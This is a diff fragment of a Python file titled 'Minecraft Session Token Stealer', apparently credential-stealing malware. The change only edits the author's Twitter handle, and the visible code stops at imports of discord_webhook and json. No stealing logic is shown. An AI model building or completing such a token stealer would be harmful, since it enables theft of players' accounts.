@@ -1,7 +1,7 @@
 # Minecraft Session Token Stealer
 # Author: WodX
 # Github: https://github.com/WodXTV
-# Twitter: https://twitter.com/wodxsex
+# Twitter: https://twitter.com/wodsex
 
 import discord_webhook
 import json
